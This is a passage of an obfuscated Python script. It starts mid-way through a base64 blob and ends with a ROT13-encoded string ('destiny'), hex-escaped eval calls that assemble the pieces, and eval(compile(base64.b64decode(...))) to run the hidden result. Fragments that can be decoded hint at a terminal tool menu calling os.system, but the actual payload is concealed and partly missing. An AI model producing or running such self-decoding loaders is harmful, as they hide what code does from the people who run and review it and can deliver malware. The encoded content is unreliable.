olMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhY'
destiny = 'KOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdPvVvVvxXPJMipvOcVTyhVUWuozqyVPuwpzSmnPx6PtxWpUWcoaDbXDbWPKOlnJ50XTLvr1y9J3gKsrXpx3gMsI0tH2IhMTyhMlOBo3pvXDbWPJkcozfkVQ0to3Zhp3ymqTIgXTkcozfcPtxWqTygMF5moTIypPt1XDbWPJyzVTkcozfkVQ09VQN6PtxWPKOlnJ50XTLvr0q9VSA1L2Ayp3AzqJjtH2IhMPQja5TAVRyhp3EuVROepzymnS9hLI8lAGL4VvxXPDxWpTSmpjbWPJIfp2H6PtxWPKOlnJ50XTLvr0q9J8BKKFOTLJyfMJDtVPVcPtxWqTygMF5moTIypPtjYwVcPtylMKZbXDcxMJLtoJScovtcBtbWL2uyL2gsnJ50pvtcPtyipl5mrKA0MJ0bW2AfMJSlWlxXPKOlnJ50XTkiM28cPtyjpzyhqPuMXDbWo3Zhp3ymqTIgXTLaMTS0CFDbMTS0MFxtWvLtMJAbolO7JK0tVBXpelO7I31GIRSFIRIRVR9BVQbtr0A9WTEuqPpcPtyjpzyhqPuzVagKsIkhYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0vXDbWpUWcoaDbMvW7JK3vzdRtITucplO0o29fVTymVT9hoUxtMz9lVRIxqJAuqTyiozSfVSO1paOip2ImVPRvXDbWpUWcoaDbMvW7I30gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFVcPtyjpzyhqPuzVykhr0q9D2uio3AyVRShrFOCpUEco25povVcPty0MKu0VQ0tXTLvVvW7E31or1q9ZKgUsI17Ha0tDzSupRpgDIEHDHAYVUgKsG4+Cykhr0q9J3gKsGW7E31qr1y9VSqVDIEGDIODVRWCGHWSHagKsFN+Cw5poagUsIg7I30mr0q9KKgMsFOOLz91qPO7I30+Cw5poagUsIg7I300r0q9KKgMsFOSrTy0VUgKsG4+CykhVvVvXDbWpUWcoaDbqTI4qPxXPJRtCFOcoaO1qPuzVagFsFN+Cw4tr0q9VvxXPJyzVTRtCG0tWmRaBtbWPKAgpltcPtyyoTyzVTRtCG0tWmVaBtbWPKqjLz9gLvtcPtyyoTyzVTRtCG0tWmZaBtbWPKOlnJ50XTLvr0A9KT4tDJkfVRAlMJEcqPN6VRglnKAbozRtH2yhM2ttHzSdpUI0VSkhVUgUsHAiMTIxVTW5VRShp2ttETSxq2SfKT5poagKsKgfnJA9KT5povVcPtxWpzImXPxWPtyyoTyzVTRtCG0tWmDaBtbWPKA5pl5yrTy0XQRcPtyyoUAyBtbWPKWyqUIlovOgLJyhXPxWPzEyMvOlMKZbXGbXPKV9nJ5jqKDbMvW7JK1RolO5o3Htq2ShqPO0olOlMKA0LKW0VSg5Y25qVQ0tVvxXPJyzVUVtCG0arFp6PtxWoJScovtcPtyyoUAyBtbWPKOlnJ50XTtkXDbWPKOlnJ50XTLvEz9foT93VT9hVRyaVQbtr1q9DTglnKAbK25uKmV1AwtvXDbWPJI4nKDbXDcjpzyhqPuGqUyfMF5PHxyUFSDcPDxXoJScovtc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
